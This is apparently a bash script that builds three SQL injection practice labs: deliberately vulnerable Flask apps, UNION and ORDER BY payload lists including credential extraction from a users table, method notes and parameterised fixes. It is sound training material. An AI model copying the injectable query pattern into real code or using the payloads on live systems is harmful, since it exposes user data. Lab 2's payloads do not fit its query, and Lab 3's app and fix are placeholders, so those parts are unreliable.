#!/usr/bin/env bash
set -e

BASE="/home/karime/portswigger_labs/sqli/01-union-advanced"

echo "[+] Building UNION Advanced Series..."
echo "    $BASE"

mkdir -p "$BASE"/{01-column-count,02-string-extraction,03-db-fingerprinting}

# =========================================================
# LAB 1 — COLUMN COUNT DETECTION
# =========================================================

mkdir -p "$BASE/01-column-count"/{vuln,exploit,notes,fix,payloads,db}

cat > "$BASE/01-column-count/README.md" << 'EOF'
# LAB 1 — UNION Column Count Detection

## Goal
Find number of columns using ORDER BY + NULL injection.

EOF

cat > "$BASE/01-column-count/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/search")
def search():
    q = request.args.get("q", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = f"SELECT name FROM products WHERE name LIKE '%{q}%'"

    try:
        cur.execute(query)
        return {"status": "ok"}
    except Exception as e:
        return {"error": str(e)}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/01-column-count/exploit/payloads.txt" << 'EOF'
# Detect columns

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# UNION NULL probing

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
EOF

cat > "$BASE/01-column-count/notes/methodology.txt" << 'EOF'
STEP 1: Use ORDER BY until crash
STEP 2: Confirm column count
STEP 3: Match UNION SELECT NULL count
EOF

cat > "$BASE/01-column-count/fix/app.py" << 'EOF'
query = "SELECT name FROM products WHERE name LIKE ?"
cur.execute(query, ('%' + q + '%',))
EOF


# =========================================================
# LAB 2 — STRING EXTRACTION VIA UNION
# =========================================================

mkdir -p "$BASE/02-string-extraction"/{vuln,exploit,notes,fix,payloads,db}

cat > "$BASE/02-string-extraction/README.md" << 'EOF'
# LAB 2 — UNION String Extraction

## Goal
Extract data using UNION across multiple columns.

EOF

cat > "$BASE/02-string-extraction/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/product")
def product():
    pid = request.args.get("id", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = f"SELECT name FROM products WHERE id = {pid}"

    try:
        cur.execute(query)
        return {"ok": True}
    except Exception as e:
        return {"error": str(e)}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/02-string-extraction/exploit/payloads.txt" << 'EOF'
# Extract DB content

' UNION SELECT username FROM users--
' UNION SELECT password FROM users--

# Multi-column extraction

' UNION SELECT username, password FROM users--
EOF

cat > "$BASE/02-string-extraction/notes/methodology.txt" << 'EOF'
STEP 1: Confirm column count
STEP 2: Inject UNION SELECT
STEP 3: Map output columns
EOF

cat > "$BASE/02-string-extraction/fix/app.py" << 'EOF'
query = "SELECT name FROM products WHERE id = ?"
cur.execute(query, (pid,))
EOF


# =========================================================
# LAB 3 — DBMS FINGERPRINTING
# =========================================================

mkdir -p "$BASE/03-db-fingerprinting"/{vuln,exploit,notes,fix,payloads,db}

cat > "$BASE/03-db-fingerprinting/README.md" << 'EOF'
# LAB 3 — DBMS Fingerprinting via UNION

## Goal
Detect database type using UNION payload behavior.

EOF

cat > "$BASE/03-db-fingerprinting/vuln/app.py" << 'EOF'
from flask import Flask, request

app = Flask(__name__)

@app.route("/check")
def check():
    q = request.args.get("q", "")

    # Simulated unsafe backend query
    return {"result": "processed: " + q}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/03-db-fingerprinting/exploit/payloads.txt" << 'EOF'
# MySQL version
' UNION SELECT @@version--

# PostgreSQL version
' UNION SELECT version()--

# MSSQL version
' UNION SELECT @@version--
EOF

cat > "$BASE/03-db-fingerprinting/notes/methodology.txt" << 'EOF'
STEP 1: Test DB-specific functions
STEP 2: Observe error differences
STEP 3: Identify DB engine
EOF

cat > "$BASE/03-db-fingerprinting/fix/app.py" << 'EOF'
query = "SELECT 1"
EOF


echo "[+] UNION Advanced Series completed successfully"
